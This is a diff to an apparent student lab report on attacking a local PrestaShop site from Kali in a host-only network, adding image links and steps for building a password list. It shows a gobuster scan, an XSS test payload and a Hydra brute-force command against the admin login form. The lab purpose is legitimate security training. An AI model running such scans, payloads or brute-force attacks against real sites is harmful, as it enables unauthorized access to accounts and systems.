@@ -217,28 +217,43 @@ Network: Host‑Only Adapter for Ubuntu ↔ Kali communication.
 gobuster dir -u http://192.168.56.101/prestashop -w /usr/share/wordlists/dirb/common.txt
 ```
 
-Evidence: gobuster_scan.png
+<img src="screenshots/gobuster_scan.png" width="500">
 
 ### 3.3 Attack 2 — XSS Injection Test
 ```
 <script>alert('XSS')</script>
 ```
 
-Evidence: xss_test_result.png
+![XSS Test Result](screenshots/xss_test_result.png)
 
-### 3.4 Attack 3 — Brute Force Admin Login (Hydra)
+### 3.4 Attack 3 — Brute Force Admin Login (Hydra)  
+Create a new file called **passwords.txt**
+```
+nano passwords.txt
+```
+
+**Then enter passwords you want to test, one per line, for example:**  
+123456  
+psswrd  
+admin123  
+qwerty  
+PrestaShop2026  
+StrongPass!  
+
+**Save the file (Ctrl+O → Enter) and exit (Ctrl+X).**  
+Now **passwords.txt** can be used with Hydra:
 ```
 hydra -l admin@example.com -P passwords.txt 192.168.56.101 http-post-form "/prestashop/admin7xk29df/index.php:email=^USER^&passwd=^PASS^:Invalid"
 ```
 
-Evidence: hydra_attack.png
+![Hydra Attack](screenshots/hydra_attack.png)
 
-Apache log evidence:
+**Apache log evidence:**
 ```
 sudo tail -n 50 /var/log/apache2/error.log
 ```
 
-Evidence: apache_log_evidence.png
+![Apache Logs](screenshots/apache_log.png)
 
 ---
 
